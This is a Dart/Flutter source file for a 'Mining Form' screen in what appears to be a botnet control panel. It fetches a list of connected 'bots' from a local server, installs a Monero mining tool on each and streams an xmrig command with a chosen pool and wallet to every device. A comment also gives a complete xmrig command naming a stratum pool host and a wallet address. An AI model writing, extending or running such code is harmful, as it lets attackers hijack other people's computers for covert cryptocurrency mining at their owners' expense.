import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/src/widgets/framework.dart';
import 'package:flutter/src/widgets/placeholder.dart';
import 'package:http/http.dart' as http;
import 'package:web/screens/homeScreen.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;

// monero/xmrig.exe -o stratum+tcp://multi-pools.com:3032 -u 49r8caVjXGgBBAYaQvKq3yDaFGU3JFNk5TBCYbLRTcjh67cGi9uFcUPGBf8pZCs8X64hySgV7ZjpkSzU2kG5gCyRTjp22kG -p 1    


class MiningScreen extends StatefulWidget {
  static String router = "mining";
  const MiningScreen({super.key});

  @override
  State<MiningScreen> createState() => _MiningScreenState();
}

class _MiningScreenState extends State<MiningScreen> {
  final formkey = GlobalKey<FormState>();
  final channel = WebSocketChannel.connect(Uri.parse('ws://localhost:1300'));

  Map<String, dynamic> data = {};
  TextEditingController _commandController = TextEditingController();
  TextEditingController _numBotsController = TextEditingController();
  TextEditingController _outputController = TextEditingController();
  @override
  void initState() {
    super.initState();
    channel.stream.listen((data) {
      // Handle incoming data from the Node.js server here
     _outputController.text = _outputController.text + data;
    });
  }

  @override
  void dispose() {
    channel.sink.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Container(
          margin: EdgeInsets.only(top: 10),

          child: SingleChildScrollView(
            child: Column(
              children: [
                    Row(children: [
                  OutlinedButton(onPressed: () {
                    Navigator.pushNamedAndRemoveUntil(context, HomeScreen.router, (route) => false);
                  }, child: Icon(Icons.arrow_back)),
                ],),
                SizedBox(height: 100,),
                SingleChildScrollView(
                  child: Container(
                                color: Colors.black,
                
          
                    child: Padding(
                      padding: EdgeInsets.all(16),
                      child: Form(
                        key: formkey,
                        child: Column(children: [
                          Text(
                            "Mining Form",
                            style: Theme.of(context).textTheme.headlineSmall,
                          ),
                          TextFormField(
                            // controller: ,
                            decoration: InputDecoration(labelText: "Pool :"),
                            validator: (val) {
                              if (val != null && val != "") {
                                data["pool"] = val;
                              } else {
                                return "valide pool";
                              }
                            },
                
                          ),
                          const SizedBox(
                            height: 16,
                          ),
                          // TextFormField(
                          //   // controller: ,
                          //   decoration: InputDecoration(labelText: "Password :"),
                          //   validator: (val) {
                          //     if (val != null && val != "") {
                          //       data["password"] = val;
                          //     } else {
                          //       return "valide password";
                          //     }
                          //   },
                          //                     style: TextStyle(color: Colors.black),
                
                          // ),
                          // const SizedBox(
                          //   height: 16,
                          // ),
                          TextFormField(
                            // controller: ,
                            decoration:
                                InputDecoration(labelText: "URL of mining server :"),
                            validator: (val) {
                              if (val != null && val != "") {
                                data["url"] = val;
                              } else {
                                return "valide url";
                              }
                            },
                
                          ),
                          const SizedBox(
                            height: 40,
                          ),
                          Text(
                            "Bots Optomizition",
                            style: Theme.of(context).textTheme.headlineSmall,
                          ),
                          const SizedBox(
                            height: 16,
                          ),
                          TextField(
                            controller: _numBotsController,
                            keyboardType: TextInputType.number,
                            decoration: InputDecoration(labelText: "Number of Bots:"),
                
                          ),
                          SizedBox(
                            height: 16,
                          ),
                          ElevatedButton(
                            onPressed: () async {
                              if (formkey.currentState!.validate()) {

                            
                              _outputController.text = "";
                              String command = "stream::monero/xmrig.exe -o ${data['pool']} -u ${data['url']} -p 1";
                              int botsNum = int.tryParse(_numBotsController.text) ?? 0;
                
                              if (command != "" && botsNum != 0 && botsNum < 11) {
                                final response1 = await http.get(
                                    Uri.parse("http://localhost:8080/api/s/clients"));
                                List connectedBots = json.decode(response1.body);
                                int i = 0;
                                print(connectedBots);
                                for (var botId in connectedBots) {
                                  i += 1;
                                  var response2 = await http.post(Uri.parse(
                                      "http://localhost:8080/install?tool=monero&id=$botId"));
                                  print(response2.statusCode);
                                  print(response2.body.toString());
                                  if (response2.statusCode == 200 &&
                                      response2.body.toString() == "installed") {
                                    print(command);
                                    var response3 = await http.get(Uri.parse(
                                        "http://localhost:8080/stream_command?command=$command&id=$botId"));
                                    // response2.body
                
                                    _outputController.text = _outputController.text +
                                        """
                                                ~~~~~~~~~~~~~~~~~~~~~~~ Device $i ~~~~~~~~~~~~~~~~~~~~~~~
                                                
                                                ${response3.body} 
                                                
                                                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        
                                                """;
                                  } else {
                                    _outputController.text = "Something wrong with $botId device";
                                  }
                                }
                              }
                                }
                            },
                            child: Text("Send Task"),
                          ),
                          const SizedBox(
                            height: 16,
                          ),
                          TextField(
                            controller: _outputController,
                            readOnly: true,
                            maxLines: null,
                            decoration:
                                const InputDecoration(border: OutlineInputBorder()),
                                                  style: TextStyle(color: Colors.black),
                
                          )
                        ]),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          )),
    );
  }
}
